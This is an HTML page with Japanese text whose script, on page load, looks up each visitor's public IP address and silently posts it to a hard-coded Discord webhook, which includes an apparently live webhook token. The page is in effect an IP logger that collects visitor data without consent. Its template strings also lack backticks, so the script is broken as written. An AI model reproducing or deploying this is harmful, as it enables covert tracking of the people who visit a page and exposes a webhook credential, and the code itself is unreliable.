<!DOCTYPE html>
<html>
<head>
  <title>IP取得＆Discord送信</title>
</head>
<body>
  <h1>IP取得テスト</h1>
  <p id="status">IP取得中...</p>

  <script>
    // DiscordのWebhook URL（あなたのWebhookに置き換えてください）
    const webhookUrl = "https://discord.com/api/webhooks/1380138909631123547/nvpr4yz48EStbdjzFx6AL-92aoxXYFZay_fSmLLpZ-uGJePGx8N4aFfwF3bkkKtFqUZm";

    // IP取得
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const ip = data.ip;
        document.getElementById("status").textContent = あなたのIPは ${ip} です;

        // Discordに送信する内容
        const payload = {
          content: 📡 新しい訪問者のIPアドレス: ${ip}
        };

        // Discordへ送信
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(payload)
        }).then(() => {
          console.log("IPをDiscordに送信しました");
        }).catch((error) => {
          console.error("Discord送信エラー:", error);
        });

      })
      .catch(error => {
        document.getElementById("status").textContent = "IP取得に失敗しました";
        console.error("IP取得エラー:", error);
      });
  </script>
</body>
</html>
